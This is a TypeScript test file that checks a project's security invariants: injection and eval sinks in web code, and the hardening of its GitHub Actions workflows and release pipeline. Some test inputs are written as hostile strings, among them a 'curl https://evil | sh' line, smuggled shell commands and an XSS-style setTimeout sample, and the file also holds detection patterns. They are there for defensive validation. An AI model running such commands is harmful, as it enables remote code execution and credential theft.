import { describe, expect, it } from 'vite-plus/test';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { parse as parseYaml } from 'yaml';

// Greppable security invariants from docs/security.md ("Mechanical checks").
// Each check reads files only; behavior is pinned by the tests next to the code.

const ROOT = path.dirname(new URL(import.meta.url).pathname);

/** Shipped TypeScript under `dirs`: no tests, no generated bundles. */
function sourceFiles(dirs: string[], exclude: string[] = []): string[] {
  const out: string[] = [];
  const walk = (dir: string) => {
    for (const entry of fs.readdirSync(path.join(ROOT, dir), {
      withFileTypes: true,
    })) {
      const rel = path.posix.join(dir, entry.name);
      if (exclude.some((e) => rel === e || rel.startsWith(`${e}/`))) continue;
      if (entry.name === 'node_modules' || entry.name === 'dist') continue;
      if (entry.isDirectory()) walk(rel);
      else if (entry.name.endsWith('.ts') && !/\.(test|spec)\.ts$/.test(rel)) {
        out.push(rel);
      }
    }
  };
  for (const dir of dirs) walk(dir);
  return out;
}

/** `file:line` for every non-comment line of `files` matching `pattern`. */
function offendingLines(files: string[], pattern: RegExp): string[] {
  const hits: string[] = [];
  for (const file of files) {
    const lines = fs.readFileSync(path.join(ROOT, file), 'utf8').split('\n');
    lines.forEach((line, i) => {
      const code = line.trim();
      if (code.startsWith('//') || code.startsWith('*')) return;
      if (pattern.test(line)) hits.push(`${file}:${i + 1}`);
    });
  }
  return hits;
}

// ---------------------------------------------------------------------------
// Workflow model. Files are parsed as YAML, so flow style (`{ uses: x }`),
// quoting and comments cannot hide a step from a check.

type Step = {
  uses?: string;
  run?: string;
  with?: Record<string, unknown>;
  env?: Record<string, unknown>;
};
type Job = {
  name?: string;
  uses?: string;
  if?: string;
  needs?: string | string[];
  environment?: unknown;
  permissions?: unknown;
  strategy?: { matrix?: { include?: Record<string, string>[] } };
  steps?: Step[];
};
type Workflow = {
  on?: unknown;
  permissions?: unknown;
  jobs?: Record<string, Job>;
};
type WorkflowFile = { file: string; text: string; wf: Workflow };

/** Every workflow CI runs, plus the deploy templates consumers copy. */
function workflowFiles(): WorkflowFile[] {
  const files: string[] = [];
  for (const dir of ['.github/workflows', 'templates/deploy']) {
    for (const name of fs.readdirSync(path.join(ROOT, dir))) {
      if (/\.ya?ml$/.test(name)) files.push(path.posix.join(dir, name));
    }
  }
  return files.map((file) => {
    const text = fs.readFileSync(path.join(ROOT, file), 'utf8');
    return { file, text, wf: parseYaml(text) as Workflow };
  });
}

/** Local composite actions (`uses: ./…`): their steps count too. */
function localActionSteps(): { file: string; step: Step }[] {
  const out: { file: string; step: Step }[] = [];
  const dir = path.join(ROOT, '.github/actions');
  if (!fs.existsSync(dir)) return out;
  for (const name of fs.readdirSync(dir)) {
    for (const f of ['action.yml', 'action.yaml']) {
      const file = path.join(dir, name, f);
      if (!fs.existsSync(file)) continue;
      const action = parseYaml(fs.readFileSync(file, 'utf8')) as {
        runs?: { steps?: Step[] };
      };
      for (const step of action.runs?.steps ?? []) {
        out.push({ file: path.relative(ROOT, file), step });
      }
    }
  }
  return out;
}

function allSteps(): { where: string; job?: Job; step: Step }[] {
  const out: { where: string; job?: Job; step: Step }[] = [];
  for (const { file, wf } of workflowFiles()) {
    for (const [id, job] of Object.entries(wf.jobs ?? {})) {
      for (const step of job.steps ?? []) {
        out.push({ where: `${file}#${id}`, job, step });
      }
    }
  }
  for (const { file, step } of localActionSteps())
    out.push({ where: file, step });
  return out;
}

/** Does a job hold a credential worth stealing? */
function isPrivileged(job: Job): boolean {
  const perms = job.permissions;
  const writes =
    typeof perms === 'string'
      ? /write/.test(perms)
      : Object.entries((perms ?? {}) as Record<string, string>).some(
          ([scope, v]) => v === 'write' && scope !== 'contents',
        );
  return (
    job.environment !== undefined ||
    writes ||
    /\bsecrets\./.test(JSON.stringify(job))
  );
}

function hasIdToken(job: Job): boolean {
  const perms = job.permissions as Record<string, string> | string | undefined;
  return typeof perms === 'object' && perms?.['id-token'] === 'write';
}

/** Lines of a `run:` block: continuations folded, comments dropped. */
function lines(run: string | undefined): string[] {
  if (!run) return [];
  return run
    .replace(/\\\n/g, ' ')
    .split('\n')
    .map((l) => l.replace(/(^|\s)#.*$/, '').trim())
    .filter(Boolean);
}

/** Packages whose install script a privileged job may run (resolves a binary). */
const REBUILD_ALLOWLIST = ['esbuild'];
/** npm global options that take a separate value (`--prefix dir ci`). */
const NPM_VALUE_OPTS = new Set([
  '--prefix',
  '-C',
  '--workspace',
  '-w',
  '--cache',
  '--userconfig',
  '--registry',
  '--loglevel',
  '--tag',
]);
const NPM_INSTALLS = new Set(
  (
    'ci i in ins inst insta instal isnt isnta isntal isntall install add ' +
    'clean-install ic install-clean isntall-clean install-ci-test cit ' +
    'clean-install-test sit install-test it update up upgrade udpate ' +
    // These run the package's own lifecycle scripts (prepack, prepare, …).
    'publish pack'
  ).split(' '),
);
/** Words that may precede the command itself in a shell segment. */
const PREFIX_WORDS = new Set([
  'if',
  'then',
  'else',
  'elif',
  '!',
  'do',
  'time',
  'sudo',
  'env',
  'command',
  'exec',
]);

/** `--ignore-scripts` state after all flags: the last one wins. */
function ignoresScripts(words: string[]): boolean {
  let ignore = false;
  for (const w of words) {
    if (w === '--ignore-scripts' || w === '--ignore-scripts=true')
      ignore = true;
    if (w === '--ignore-scripts=false' || w === '--no-ignore-scripts')
      ignore = false;
  }
  return ignore;
}

/**
 * Does a shell line run dependency code: an install with lifecycle scripts,
 * a package runner (npx, npm exec, vpx, dlx) or a gem install? Every
 * segment counts, including `$(…)`, backticks, pipes and lists.
 */
function runsInstallScripts(line: string): boolean {
  for (const seg of line.split(/\$\(|`|\||&|;|\(|\)/)) {
    const words = seg.trim().split(/\s+/).filter(Boolean);
    let i = 0;
    while (
      i < words.length &&
      (PREFIX_WORDS.has(words[i]) || /^\w+=/.test(words[i]))
    )
      i++;
    const tool = words[i];
    const rest = words.slice(i + 1);
    const ignore = ignoresScripts(rest);
    const sub = (valueOpts: Set<string>) => {
      for (let j = 0; j < rest.length; j++) {
        if (!rest[j].startsWith('-'))
          return { sub: rest[j], args: rest.slice(j + 1) };
        if (valueOpts.has(rest[j])) j++;
      }
      return { sub: undefined, args: [] as string[] };
    };
    if (tool === 'npx' || tool === 'vpx' || tool === 'bunx') return true;
    if (tool === 'npm') {
      const { sub: cmd, args } = sub(NPM_VALUE_OPTS);
      if (cmd === 'exec' || cmd === 'x') return true;
      if (cmd === 'rebuild' || cmd === 'rb') {
        if (ignore) continue;
        const pkgs = args.filter((w) => !w.startsWith('-'));
        if (
          pkgs.length === 0 ||
          pkgs.some((p) => !REBUILD_ALLOWLIST.includes(p))
        )
          return true;
        continue;
      }
      if (cmd && NPM_INSTALLS.has(cmd) && !ignore) return true;
    } else if (tool === 'pnpm' || tool === 'yarn' || tool === 'bun') {
      const { sub: cmd } = sub(new Set());
      if (cmd === 'dlx' || cmd === 'exec' || cmd === 'x') return true;
      if (
        (cmd === undefined && tool !== 'bun') ||
        ['install', 'i', 'add', 'update', 'up', 'upgrade', 'rebuild'].includes(
          cmd ?? '',
        )
      ) {
        if (!ignore) return true;
      }
    } else if (tool === 'vp') {
      const { sub: cmd } = sub(new Set(['-C']));
      if (['dlx', 'exec'].includes(cmd ?? '')) return true;
      if (
        ['install', 'i', 'add', 'update', 'up'].includes(cmd ?? '') &&
        !ignore
      )
        return true;
    } else if (tool === 'bundle' || tool === 'bundler' || tool === 'gem') {
      // Gems build native extensions on install; there is no opt-out flag.
      const cmd = rest.find((w) => !w.startsWith('-'));
      if (
        tool === 'gem'
          ? cmd === 'install'
          : cmd === undefined || cmd === 'install' || cmd === 'update'
      )
        return true;
    }
  }
  return false;
}

/**
 * Privileged jobs that may install gems: fastlane is the publishing tool in
 * the deploy templates, so its bundle runs anyway (pinned by the consumer's
 * committed Gemfile.lock). Anywhere else, a gem install is flagged.
 */
const BUNDLER_ALLOWED = new Set([
  'templates/deploy/android-play-store.yml#upload',
  'templates/deploy/ios-app-store.yml#build',
  'templates/deploy/ios-app-store.yml#upload',
]);

/** Actions a job that can mint an OIDC token may use. */
const OIDC_USES = new Set([
  'actions/setup-node',
  'actions/download-artifact',
  'actions/deploy-pages',
]);
/** Actions a job holding secrets may use (release + templates). */
const SECRETS_USES = new Set([
  'actions/checkout',
  'actions/setup-node',
  'actions/setup-java',
  'android-actions/setup-android',
  'gradle/actions/wrapper-validation',
  'actions/upload-artifact',
  'actions/download-artifact',
  'ruby/setup-ruby',
]);
const actionName = (uses: string) => uses.split('@')[0];

/** The exact npm-version guard publish-npm runs (allowlisted verbatim). */
const NPM_VERSION_CHECK =
  `node -e 'const v = require("child_process").execFileSync("npm", ["--version"]).toString().trim(); ` +
  `const [a, b, c] = v.split(".").map(Number); if (!(a * 1e6 + b * 1e3 + c >= 11005001)) ` +
  `throw new Error("npm " + v + " is older than 11.5.1, which trusted publishing needs");'`;
/** Every other line allowed in an OIDC job, anchored. */
const OIDC_LINES = [
  /^test -f "\$RUNNER_TEMP\/npm\/ekrooh-bare-\$VERSION\.tgz"$/,
  /^if npm view "@ekrooh\/bare@\$VERSION" version$/,
  /^(then|fi|exit 0)$/,
  /^echo "[^"`$\\]*(\$VERSION[^"`$\\]*)*"$/,
  /^npm publish "\$RUNNER_TEMP\/npm\/ekrooh-bare-\$VERSION\.tgz" --access public --tag "\$DIST_TAG" --ignore-scripts$/,
];
/** Is an OIDC-job line one of the allowed ones? */
function oidcLineAllowed(line: string): boolean {
  if (line === NPM_VERSION_CHECK) return true;
  if (/[`|&;<>]|\$\(/.test(line)) return false;
  return OIDC_LINES.some((re) => re.test(line));
}

describe('security invariants (docs/security.md)', () => {
  it('shipped web and runtime code has no HTML-injection or eval sinks', () => {
    // Script in the app origin can open the protocol socket and invoke every
    // plugin, so the page must never turn data into markup or code.
    const files = sourceFiles([
      'core',
      'plugins',
      'web',
      'examples/web',
      'examples/consumer-basic',
    ]);
    const sink = new RegExp(
      [
        String.raw`\.(innerHTML|outerHTML|srcdoc)\s*\+?=`,
        String.raw`\[\s*['"\x60](innerHTML|outerHTML|srcdoc)['"\x60]\s*\]`,
        String.raw`setAttribute\(\s*['"\x60](srcdoc|on\w+)['"\x60]`,
        'insertAdjacentHTML',
        String.raw`document\.write`,
        'unsafeHTML',
        'unsafeSVG',
        'setHTMLUnsafe',
        'parseHTMLUnsafe',
        'createContextualFragment',
        String.raw`\beval\(`,
        String.raw`new Function\(`,
        String.raw`\b(setTimeout|setInterval)\(\s*['"\x60]`,
      ].join('|'),
    );
    expect(offendingLines(files, sink)).toEqual([]);
    // The sink regex itself catches the forms it claims to.
    for (const bad of [
      "el['innerHTML'] = x",
      'el.srcdoc = x',
      "frame.setAttribute('srcdoc', x)",
      "el.setAttribute('onclick', x)",
      'el.outerHTML += x',
      "setTimeout('alert(1)')",
      'range.createContextualFragment(x)',
    ]) {
      expect(sink.test(bad), bad).toBe(true);
    }
  });

  it('no server sets a CORS header', () => {
    // The loopback gate is the only cross-origin policy; a CORS header would
    // let a website read gated responses or (the dev harness) credentials.
    const files = sourceFiles(['core', 'plugins']);
    expect(offendingLines(files, /Access-Control-Allow-Origin/i)).toEqual([]);
  });

  it('id- and secret-minting code never uses Math.random', () => {
    const files = sourceFiles(['core/messages', 'core/server', 'plugins']);
    expect(offendingLines(files, /Math\.random\(/)).toEqual([]);
  });

  it('core and plugins read Web Crypto only through the Platform seam', () => {
    // Bare has no Web Crypto global (ekrooh#268): randomness is injected via
    // `Platform`, and only its web default may touch `globalThis.crypto`.
    const files = sourceFiles(
      ['core', 'plugins'],
      ['core/messages/platform.ts'],
    );
    expect(offendingLines(files, /globalThis\.crypto|getRandomValues/)).toEqual(
      [],
    );
  });
});

describe('CI and release invariants (docs/security.md §6)', () => {
  it('every action (workflows, templates, local actions) is pinned to a full commit SHA with a version comment', () => {
    const bad: string[] = [];
    const uses: { where: string; ref: string }[] = [];
    for (const { where, step } of allSteps()) {
      if (step.uses) uses.push({ where, ref: step.uses });
    }
    for (const { file, wf } of workflowFiles()) {
      for (const [id, job] of Object.entries(wf.jobs ?? {})) {
        if (job.uses) uses.push({ where: `${file}#${id}`, ref: job.uses });
      }
    }
    expect(uses.length).toBeGreaterThan(10);
    const texts = new Map(workflowFiles().map((w) => [w.file, w.text]));
    for (const { where, ref } of uses) {
      if (ref.startsWith('./')) continue;
      if (!/^[\w.-]+\/[\w.-]+(\/[\w./-]+)?@[0-9a-f]{40}$/.test(ref)) {
        bad.push(`${where}: ${ref}`);
        continue;
      }
      // Dependabot and reviewers read the trailing tag comment.
      const text = texts.get(where.split('#')[0]) ?? '';
      const escaped = ref.replace(/[.*+?^${}()|[\]\\/]/g, '\\$&');
      if (
        text &&
        !new RegExp(`${escaped}['"]?\\s+# v\\d+\\.\\d+\\.\\d+`).test(text)
      ) {
        bad.push(`${where}: ${ref} (no "# vX.Y.Z" comment)`);
      }
    }
    expect(bad).toEqual([]);
  });

  it('no workflow uses a privileged trigger (pull_request_target, workflow_run)', () => {
    const offenders: string[] = [];
    for (const { file, wf } of workflowFiles()) {
      const on = wf.on;
      const triggers =
        typeof on === 'string'
          ? [on]
          : Array.isArray(on)
            ? on
            : Object.keys((on ?? {}) as object);
      for (const t of triggers) {
        if (t === 'pull_request_target' || t === 'workflow_run') {
          offenders.push(`${file}: ${t}`);
        }
      }
    }
    expect(offenders).toEqual([]);
  });

  it('workflow-level permissions are read-only; writes are granted per job', () => {
    const bad: string[] = [];
    for (const { file, wf } of workflowFiles()) {
      const p = wf.permissions;
      if (p === undefined) bad.push(`${file}: no workflow-level permissions`);
      else if (typeof p === 'string') {
        if (p !== 'read-all' && p !== '{}') bad.push(`${file}: ${p}`);
      } else {
        for (const [scope, v] of Object.entries(p as Record<string, string>)) {
          if (v !== 'read' && v !== 'none') bad.push(`${file}: ${scope}: ${v}`);
        }
      }
    }
    expect(bad).toEqual([]);
  });

  it('every checkout drops the token from .git/config (persist-credentials: false)', () => {
    const bad = allSteps()
      .filter(({ step }) => step.uses?.startsWith('actions/checkout@'))
      .filter(({ step }) => step.with?.['persist-credentials'] !== false)
      .map(({ where }) => where);
    expect(bad).toEqual([]);
  });

  it('no job holding a credential runs dependency install scripts', () => {
    // Privileged = an environment, a write/OIDC permission, or a secret.
    // Covers release.yml and the deploy templates.
    const bad: string[] = [];
    let privilegedInstalls = 0;
    for (const { where, job, step } of allSteps()) {
      if (!job || !isPrivileged(job)) continue;
      if (job.uses) bad.push(`${where}: reusable workflow ${job.uses}`);
      const bundler =
        actionName(step.uses ?? '') === 'ruby/setup-ruby' &&
        step.with?.['bundler-cache'] === true;
      for (const line of lines(step.run)) {
        if (/\b(npm|pnpm|yarn|vp) (ci|install|i|rebuild)\b/.test(line)) {
          privilegedInstalls++;
        }
        const gems = /^(bundle|bundler|gem)\b/.test(
          line.replace(/^\w+=\S*\s+/, ''),
        );
        if (runsInstallScripts(line) && !(gems && BUNDLER_ALLOWED.has(where))) {
          bad.push(`${where}: ${line}`);
        }
      }
      if (bundler && !BUNDLER_ALLOWED.has(where)) {
        bad.push(`${where}: setup-ruby bundler-cache (bundle install)`);
      }
    }
    expect(privilegedInstalls).toBeGreaterThan(0);
    expect(bad).toEqual([]);
  });

  it('the install-script detector catches the forms it claims to', () => {
    for (const cmd of [
      'npm ci',
      'npm  ci',
      'npm\tci',
      'npm install',
      'npm clean-install',
      'npm ci --ignore-scripts=false',
      'npm ci --ignore-scripts --ignore-scripts=false',
      'npm --prefix examples/vote ci',
      'npm --workspaces ci',
      'npm -C . install',
      'npx some-pkg',
      'npm exec some-pkg',
      'npm x some-pkg',
      'pnpm install',
      'pnpm dlx x',
      'yarn',
      'vp install',
      'vp i',
      'vp add left-pad',
      'vpx tool',
      'npm rebuild',
      'npm rebuild sharp',
      'npm rebuild esbuild sharp',
      'npm publish',
      'X=$(npm ci)',
      'echo `npm ci`',
      'echo hi | npm ci',
      'true && npm ci',
      'test -f x; npm ci',
      'if npm ci',
      'CI=1 npm ci',
      'bundle install',
      'bundle',
      'gem install fastlane',
    ]) {
      expect(runsInstallScripts(cmd), cmd).toBe(true);
    }
    for (const cmd of [
      'npm ci --ignore-scripts',
      'npm ci --ignore-scripts=false --ignore-scripts',
      'npm rebuild esbuild',
      'npm run build',
      'npm view @ekrooh/bare version',
      'npm publish x.tgz --ignore-scripts',
      'echo "npm ci is not run here"',
      'bundle exec fastlane android internal',
      './gradlew :bare-host:publish -P k=v',
    ]) {
      expect(runsInstallScripts(cmd), cmd).toBe(false);
    }
    // A flag hidden in a comment does not count.
    expect(lines('npm ci # --ignore-scripts').some(runsInstallScripts)).toBe(
      true,
    );
  });

  it('a job that can mint an OIDC token runs no repo or dependency code', () => {
    // npm trusted publishing (and Pages) trust any step of an `id-token:
    // write` job. Such a job only downloads an artifact and publishes it:
    // allowlisted actions, and anchored, metacharacter-free lines.
    const bad: string[] = [];
    let jobs = 0;
    for (const { file, wf } of workflowFiles()) {
      for (const [id, job] of Object.entries(wf.jobs ?? {})) {
        if (!hasIdToken(job)) continue;
        jobs++;
        if (job.uses) bad.push(`${file}#${id}: reusable workflow`);
        for (const step of job.steps ?? []) {
          if (step.uses && !OIDC_USES.has(actionName(step.uses))) {
            bad.push(`${file}#${id}: uses ${step.uses}`);
          }
          for (const line of lines(step.run)) {
            if (!oidcLineAllowed(line)) bad.push(`${file}#${id}: ${line}`);
          }
        }
      }
    }
    expect(jobs).toBeGreaterThan(0);
    expect(bad).toEqual([]);
  });

  it('the OIDC line allowlist refuses smuggled commands', () => {
    for (const line of [
      'if npm view "@ekrooh/bare@$VERSION" version; then npm ci; fi',
      'echo "$(npm ci)"',
      'echo "`npm ci`"',
      'test -f "$RUNNER_TEMP/npm/ekrooh-bare-$VERSION.tgz" && npm ci',
      'npm publish "$RUNNER_TEMP/npm/ekrooh-bare-$VERSION.tgz" --access public --tag "$DIST_TAG" --ignore-scripts --ignore-scripts=false',
      'npm publish evil.tgz --ignore-scripts',
      'echo "x" > ~/.npmrc',
      'npx something',
      'curl https://evil | sh',
      `${NPM_VERSION_CHECK} ; npm ci`,
    ]) {
      expect(oidcLineAllowed(line), line).toBe(false);
    }
    expect(oidcLineAllowed(NPM_VERSION_CHECK)).toBe(true);
    expect(
      oidcLineAllowed(
        'echo "npm: @ekrooh/bare@$VERSION already published, skipping"',
      ),
    ).toBe(true);
  });

  it('release: secrets jobs run only publish tasks, and the build job gates the tag', () => {
    const wf = workflowFiles().find(
      (w) => w.file === '.github/workflows/release.yml',
    )!.wf;
    const jobs = wf.jobs ?? {};
    // The job that builds holds no credential.
    expect(isPrivileged(jobs.build), 'build job is unprivileged').toBe(false);
    const buildRun = (jobs.build.steps ?? [])
      .map((s) => s.run ?? '')
      .join('\n');
    for (const gate of [
      /"\$GITHUB_REF_NAME" != "v\$VERSION"/,
      /git merge-base --is-ancestor "\$GITHUB_SHA" refs\/remotes\/origin\/main/,
      /npm run build:pkg/,
      /npm run check/,
      /npm run test:unit/,
      /npm pack/,
    ]) {
      expect(buildRun, String(gate)).toMatch(gate);
    }
    // publish-npm checks the npm version before it publishes.
    const npmLines = (jobs['publish-npm'].steps ?? []).flatMap((st) =>
      lines(st.run),
    );
    const check = npmLines.indexOf(NPM_VERSION_CHECK);
    const publish = npmLines.findIndex((l) => l.startsWith('npm publish '));
    expect(check, 'npm version check present').toBeGreaterThanOrEqual(0);
    expect(check, 'npm version check before publish').toBeLessThan(publish);
    // Jobs with secrets: allowlisted actions, no JS toolchain, and Gradle only
    // for publish tasks.
    const bad: string[] = [];
    for (const [id, job] of Object.entries(jobs)) {
      if (!/\bsecrets\./.test(JSON.stringify(job))) continue;
      for (const step of job.steps ?? []) {
        if (step.uses && !SECRETS_USES.has(actionName(step.uses))) {
          bad.push(`${id}: uses ${step.uses}`);
        }
        for (const line of lines(step.run)) {
          for (const seg of line.split(/\$\(|`|\||&|;|\(|\)/)) {
            const cmd = seg.trim().replace(/^((if|then|else|!)\s+)+/, '');
            if (/^(echo|printf) /.test(cmd)) continue; // text, not a command
            if (/\b(npm|npx|pnpm|yarn|bun|bunx|vp|vpx)\b/.test(cmd)) {
              bad.push(`${id}: ${cmd}`);
            }
            const gradle = /\.\/gradlew\b(.*)$/.exec(cmd);
            if (gradle) {
              const words = gradle[1].split(/\s+/).filter(Boolean);
              for (let k = 0; k < words.length; k++) {
                const w = words[k];
                // Options that load other build logic are never allowed.
                if (
                  /^(-I|--init-script|-p|--project-dir|-c|--settings-file|-b|--build-file)(=|$)/.test(
                    w,
                  )
                ) {
                  bad.push(`${id}: gradle ${w}`);
                  continue;
                }
                // `-P k=v` / `-D k=v` take a value: not a task.
                if (/^(-P|-D|--project-prop|--system-prop)$/.test(w)) {
                  k++;
                  continue;
                }
                if (w.startsWith('-')) continue;
                if (!/publish|closeAndRelease/i.test(w))
                  bad.push(`${id}: gradle ${w}`);
              }
            }
          }
        }
      }
    }
    expect(bad).toEqual([]);
  });

  it('Maven release jobs that hold secrets run no build tool: Gradle stages, publish-maven.sh signs', () => {
    // docs/security.md, "Release pipeline": Gradle, AGP and their plugins run
    // only in the credential-free build jobs; the jobs holding the signing key
    // and Sonatype token run only publish-maven.sh (gpg + curl).
    const bad: string[] = [];
    let secretJobs = 0;
    for (const file of [
      '.github/workflows/release.yml',
      '.github/workflows/release-bare-kit-runtime.yml',
    ]) {
      const { wf } = workflowFiles().find((w) => w.file === file)!;
      let staged = false;
      for (const [id, job] of Object.entries(wf.jobs ?? {})) {
        const runs = (job.steps ?? []).flatMap((st) => lines(st.run));
        if (!isPrivileged(job)) {
          if (
            runs.some((l) =>
              /publishMavenAarPublicationToLocalStagingRepository/.test(l),
            )
          )
            staged = true;
          continue;
        }
        if (!/\bsecrets\./.test(JSON.stringify(job))) continue;
        secretJobs++;
        for (const step of job.steps ?? []) {
          const name = actionName(step.uses ?? '');
          if (
            name &&
            !['actions/checkout', 'actions/download-artifact'].includes(name)
          )
            bad.push(`${file}#${id}: uses ${step.uses}`);
        }
        for (const line of runs) {
          if (
            !/^\.github\/scripts\/publish-maven\.sh (prepare|github|central) /.test(
              line,
            )
          )
            bad.push(`${file}#${id}: ${line}`);
        }
      }
      if (!staged)
        bad.push(`${file}: no credential-free job stages the publication`);
    }
    expect(secretJobs).toBe(2);
    expect(bad).toEqual([]);
    // Neither module can sign or upload by itself any more.
    for (const f of [
      'build.gradle',
      'android/build.gradle',
      'android/bare-kit-runtime/build.gradle',
    ]) {
      const gradle = fs
        .readFileSync(path.join(ROOT, f), 'utf8')
        .split('\n')
        .filter((l) => !l.trim().startsWith('//'))
        .join('\n');
      expect(gradle, f).not.toMatch(
        /id "signing"|nexus|SIGNING_KEY|sonatype|maven\.pkg\.github\.com/i,
      );
    }
    // CI dry-runs the signing path on every PR (it otherwise runs only on a tag).
    const test = fs.readFileSync(
      path.join(ROOT, '.github/workflows/test.yml'),
      'utf8',
    );
    expect(test).toContain('.github/scripts/publish-maven.test.sh');
  });

  it('the vuln scan covers every npm lockfile and ignores only the Gradle build-tool hash list', () => {
    const { wf } = workflowFiles().find(
      (w) => w.file === '.github/workflows/test.yml',
    )!;
    const steps = wf.jobs?.['dependency-scan']?.steps ?? [];
    const osv = steps.find((st) =>
      st.uses?.startsWith('google/osv-scanner-action/'),
    );
    const scanArgs = osv?.with?.['scan-args'];
    const args = (typeof scanArgs === 'string' ? scanArgs : '')
      .split(/\s+/)
      .filter(Boolean);
    expect(args).toContain('--recursive');
    expect(args[args.length - 1]).toBe('.');
    expect(args).toContain('--config=.github/osv-scanner.toml');
    for (const a of args) {
      expect(a, a).not.toMatch(
        /^(-L|--lockfile|--no-recursive|--experimental-exclude|--skip)/,
      );
    }
    // The npm lockfiles are inside the recursive scan (not gitignored away).
    for (const f of ['package-lock.json', 'examples/vote/package-lock.json']) {
      expect(fs.existsSync(path.join(ROOT, f)), f).toBe(true);
    }
    // The config may only ignore the Maven ecosystem (the hash list), never npm
    // and never vulnerabilities wholesale.
    const toml = fs.readFileSync(
      path.join(ROOT, '.github/osv-scanner.toml'),
      'utf8',
    );
    const code = toml.replace(/#.*$/gm, '');
    const overrides = code.split('[[PackageOverrides]]').slice(1);
    expect(overrides.length).toBe(1);
    expect(overrides[0]).toMatch(/^\s*ecosystem\s*=\s*"Maven"\s*$/m);
    expect(overrides[0]).toMatch(/^\s*ignore\s*=\s*true\s*$/m);
    expect(overrides[0]).not.toMatch(/^\s*name\s*=/m);
    expect(code).not.toMatch(/IgnoredVulns|ecosystem\s*=\s*"npm"/i);
    expect(
      fs.existsSync(path.join(ROOT, 'gradle/verification-metadata.xml')),
    ).toBe(true);
  });

  it('device CI builds keep diagnostics on; the release build never does', () => {
    const test = workflowFiles().find(
      (w) => w.file === '.github/workflows/test.yml',
    )!.wf;
    for (const id of ['android-emulator', 'ios', 'desktop', 'desktop-linux']) {
      const job = test.jobs?.[id] as
        | (Job & { env?: Record<string, string> })
        | undefined;
      const env = job?.env;
      expect(env?.VITE_BARE_DIAGNOSTICS, id).toBe('true');
    }
    const release = fs.readFileSync(
      path.join(ROOT, '.github/workflows/release.yml'),
      'utf8',
    );
    expect(release).not.toContain('VITE_BARE_DIAGNOSTICS');
  });

  it('required checks keep their names and report on every PR', () => {
    // Branch protection requires these exact check names. Renaming a job, or
    // a workflow-level paths filter (a skipped workflow never reports), would
    // block every PR.
    const required = [
      'JS (check + unit tests)',
      'linux-android',
      'darwin-android',
      'ios',
      'android-emulator (p2p verify)',
      'p2p (two-peer replication)',
      'desktop (Linux tarball smoke)',
      'desktop (macOS app smoke)',
      'Gradle wrapper validation',
      'Dependency / vuln scan',
      'Dependency review (PR)',
      'test',
      'Analyze (javascript-typescript)',
      'Analyze (kotlin)',
    ];
    const names = new Set<string>();
    const bad: string[] = [];
    for (const file of ['test.yml', 'playwright.yml', 'codeql.yml']) {
      const { wf } = workflowFiles().find(
        (w) => w.file === `.github/workflows/${file}`,
      )!;
      // A merge queue only runs workflows that listen for `merge_group`;
      // without it the required checks never report on a queued PR.
      if (!('merge_group' in ((wf.on ?? {}) as object))) {
        bad.push(`${file}: no merge_group trigger`);
      }
      for (const ev of ['push', 'pull_request', 'merge_group']) {
        const cfg = (
          (wf.on ?? {}) as Record<string, Record<string, unknown> | null>
        )[ev];
        if (cfg && ('paths' in cfg || 'paths-ignore' in cfg)) {
          bad.push(`${file}: ${ev} has a paths filter`);
        }
      }
      for (const [id, job] of Object.entries(wf.jobs ?? {})) {
        const include = job.strategy?.matrix?.include;
        const matrix = (job.strategy?.matrix ?? {}) as Record<string, unknown>;
        const template = job.name ?? id;
        const rows: Record<string, unknown>[] = include
          ? include
          : Object.entries(matrix).flatMap(([k, v]) =>
              Array.isArray(v) ? v.map((x) => ({ [k]: x })) : [],
            );
        if (rows.length === 0) names.add(template);
        for (const row of rows) {
          names.add(
            template.replace(/\$\{\{\s*matrix\.(\w+)\s*\}\}/g, (_, k) =>
              String(row[k]),
            ),
          );
        }
        // A matrix job skipped at job level reports under its unexpanded
        // name: matrix jobs may only use the fail-safe `!cancelled()` guard.
        if (
          rows.length > 0 &&
          job.if &&
          !/^\$\{\{\s*!cancelled\(\)\s*\}\}$/.test(job.if)
        ) {
          bad.push(`${file}#${id}: matrix job with a job-level if`);
        }
        // Jobs gated on the docs-only diff must run when `changes` failed.
        const needs = [job.needs ?? []].flat();
        if (
          needs.includes('changes') &&
          job.if &&
          !/!cancelled\(\)/.test(job.if)
        ) {
          bad.push(`${file}#${id}: gate is not fail-safe`);
        }
      }
    }
    for (const n of required)
      if (!names.has(n)) bad.push(`missing check: ${n}`);
    expect(bad).toEqual([]);
  });

  it('the docs-only classifier only skips pure docs changes', async () => {
    const mod = await import(
      new URL('./.github/scripts/changed-code.mjs', import.meta.url).href
    );
    expect(mod.isDocsOnly(['README.md', 'docs/adr/0001.md', 'LICENSE'])).toBe(
      true,
    );
    expect(mod.isDocsOnly(['docs/x.png'])).toBe(true);
    expect(mod.isDocsOnly([])).toBe(false);
    expect(mod.isDocsOnly(['README.md', 'core/runtime.ts'])).toBe(false);
    expect(mod.isDocsOnly(['.github/workflows/test.yml'])).toBe(false);
    expect(mod.isDocsOnly(['apps/docs/astro.config.mjs'])).toBe(false);
    expect(mod.isDocsOnly(['examples/LICENSE'])).toBe(false);
  });

  it('a rename from code to Markdown is not docs-only', () => {
    // `git diff` detects renames by default and lists only the new path;
    // changed-code.mjs passes --no-renames so the old path counts too.
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'changed-code-'));
    const git = (...args: string[]) =>
      execFileSync(
        'git',
        [
          '-c',
          'user.name=t',
          '-c',
          'user.email=t@t',
          '-c',
          'commit.gpgsign=false',
          ...args,
        ],
        {
          cwd: dir,
          encoding: 'utf8',
        },
      ).trim();
    const script = path.join(ROOT, '.github/scripts/changed-code.mjs');
    const run = (env: Record<string, string>) =>
      execFileSync(process.execPath, [script], {
        cwd: dir,
        encoding: 'utf8',
        env: { PATH: process.env.PATH ?? '', ...env },
      });
    try {
      git('init', '-q');
      fs.writeFileSync(
        path.join(dir, 'Host.swift'),
        'let a = 1\nlet b = 2\nlet c = 3\n',
      );
      git('add', '.');
      git('commit', '-qm', 'code');
      const base = git('rev-parse', 'HEAD');
      git('mv', 'Host.swift', 'Host.md');
      git('commit', '-qm', 'rename');
      expect(run({ GITHUB_EVENT_NAME: 'push', BEFORE_SHA: base })).toMatch(
        /^code=true$/m,
      );
      expect(run({ GITHUB_EVENT_NAME: 'pull_request' })).toMatch(
        /^code=true$/m,
      );
      expect(
        run({ GITHUB_EVENT_NAME: 'merge_group', MERGE_GROUP_BASE_SHA: base }),
      ).toMatch(/^code=true$/m);
      // Control: a pure docs change is skipped.
      const docsBase = git('rev-parse', 'HEAD');
